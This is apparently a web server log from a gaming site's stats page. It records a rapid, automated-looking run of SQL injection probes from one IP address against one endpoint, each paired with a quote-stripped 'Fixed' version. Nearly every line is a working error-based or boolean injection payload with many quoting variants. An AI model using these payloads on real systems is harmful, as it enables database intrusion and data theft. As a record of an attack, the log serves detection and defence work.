Date: 13-09-2017 03:14:54 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            ,,,',".(.,, Fixed: Annabelle            ,,,,.(.,, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:37 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            '||(SELECT 'OStK' WHERE 4689=4689 AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))))||', Fixed: Annabelle            (SELECT OStK WHERE 4689=4689 AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))), Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:38 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            '+(SELECT bgIX WHERE 6685=6685 AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))))+', Fixed: Annabelle            +(SELECT bgIX WHERE 6685=6685 AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))))+, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:38 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            '+(SELECT 'BfYt' WHERE 5515=5515 AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))))+', Fixed: Annabelle            +(SELECT BfYt WHERE 5515=5515 AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))))+, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:38 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            ')) AS PxWY WHERE 3934=3934 AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))-- SvIh, Fixed: Annabelle            )) AS PxWY WHERE 3934=3934 AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))-- SvIh, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:38 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            ")) AS LPEB WHERE 6933=6933 AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))-- QNDP, Fixed: Annabelle            )) AS LPEB WHERE 6933=6933 AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))-- QNDP, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:38 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            ') AS GWuc WHERE 1760=1760 AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))-- VOie, Fixed: Annabelle            ) AS GWuc WHERE 1760=1760 AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))-- VOie, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:38 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            ") AS SGOm WHERE 7601=7601 AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))-- scoW, Fixed: Annabelle            ) AS SGOm WHERE 7601=7601 AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))-- scoW, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:39 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            ` WHERE 2142=2142 AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))-- TuGu, Fixed: Annabelle             WHERE 2142=2142 AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))-- TuGu, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:39 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            `) WHERE 4653=4653 AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))-- mOJB, Fixed: Annabelle            ) WHERE 4653=4653 AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))-- mOJB, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:39 AM IP: 223.229.161.185 User : Not loggedin Code: Annabelle            ' IN BOOLEAN MODE) AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))#, Fixed: Annabelle             IN BOOLEAN MODE) AND 4473 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4473=4473) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))#, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:39 AM IP: 223.229.161.185 User : Not loggedin Code: -2855') OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))-- TEfn, Fixed: -2855) OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))-- TEfn, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:39 AM IP: 223.229.161.185 User : Not loggedin Code: -3385' OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))-- FnYr, Fixed: -3385 OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))-- FnYr, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:40 AM IP: 223.229.161.185 User : Not loggedin Code: -5004" OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))-- VTIf, Fixed: -5004 OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113)))-- VTIf, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:40 AM IP: 223.229.161.185 User : Not loggedin Code: -6109') OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND ('gixL'='gixL, Fixed: -6109) OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND (gixL=gixL, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:40 AM IP: 223.229.161.185 User : Not loggedin Code: -6775')) OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND (('GScO'='GScO, Fixed: -6775)) OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND ((GScO=GScO, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:40 AM IP: 223.229.161.185 User : Not loggedin Code: -7397'))) OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND ((('tGal'='tGal, Fixed: -7397))) OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND (((tGal=tGal, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:40 AM IP: 223.229.161.185 User : Not loggedin Code: -8087' OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND 'zCal'='zCal, Fixed: -8087 OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND zCal=zCal, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:40 AM IP: 223.229.161.185 User : Not loggedin Code: -1593') OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND ('qafu' LIKE 'qafu, Fixed: -1593) OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND (qafu LIKE qafu, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:41 AM IP: 223.229.161.185 User : Not loggedin Code: -7696')) OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND (('hcRd' LIKE 'hcRd, Fixed: -7696)) OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND ((hcRd LIKE hcRd, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:41 AM IP: 223.229.161.185 User : Not loggedin Code: -2172'))) OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND ((('oRmv' LIKE 'oRmv, Fixed: -2172))) OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND (((oRmv LIKE oRmv, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:41 AM IP: 223.229.161.185 User : Not loggedin Code: -9961' OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND 'Vqjd' LIKE 'Vqjd, Fixed: -9961 OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND Vqjd LIKE Vqjd, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:41 AM IP: 223.229.161.185 User : Not loggedin Code: -2794") OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND ("wlBz"="wlBz, Fixed: -2794) OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND (wlBz=wlBz, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:41 AM IP: 223.229.161.185 User : Not loggedin Code: -6190")) OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND (("eOqx"="eOqx, Fixed: -6190)) OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND ((eOqx=eOqx, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:41 AM IP: 223.229.161.185 User : Not loggedin Code: -4508"))) OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND ((("UDnw"="UDnw, Fixed: -4508))) OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND (((UDnw=UDnw, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:41 AM IP: 223.229.161.185 User : Not loggedin Code: -5092" OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND "FaMF"="FaMF, Fixed: -5092 OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND FaMF=FaMF, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:41 AM IP: 223.229.161.185 User : Not loggedin Code: -2683") OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND ("tRCa" LIKE "tRCa, Fixed: -2683) OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND (tRCa LIKE tRCa, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:41 AM IP: 223.229.161.185 User : Not loggedin Code: -9687")) OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND (("lWZj" LIKE "lWZj, Fixed: -9687)) OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND ((lWZj LIKE lWZj, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:42 AM IP: 223.229.161.185 User : Not loggedin Code: -3703"))) OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND ((("eVoW" LIKE "eVoW, Fixed: -3703))) OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND (((eVoW LIKE eVoW, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:42 AM IP: 223.229.161.185 User : Not loggedin Code: -7088" OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND "Yjfb" LIKE "Yjfb, Fixed: -7088 OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND Yjfb LIKE Yjfb, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:42 AM IP: 223.229.161.185 User : Not loggedin Code: -5319%') OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND ('%'=', Fixed: -5319%) OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND (%=, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:42 AM IP: 223.229.161.185 User : Not loggedin Code: -2945%')) OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND (('%'=', Fixed: -2945%)) OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND ((%=, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:42 AM IP: 223.229.161.185 User : Not loggedin Code: -5529%'))) OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND ((('%'=', Fixed: -5529%))) OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND (((%=, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:42 AM IP: 223.229.161.185 User : Not loggedin Code: -9316%' OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND '%'=', Fixed: -9316% OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND %=, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:42 AM IP: 223.229.161.185 User : Not loggedin Code: -2143%") OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND ("%"=", Fixed: -2143%) OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND (%=, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
Date: 13-09-2017 03:18:43 AM IP: 223.229.161.185 User : Not loggedin Code: -1370%")) OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND (("%"=", Fixed: -1370%)) OR 4240 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4240=4240) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(98)+CHAR(113))) AND ((%=, Link: http://www.a3ultimate.com/Stats/get_rbdetails.php
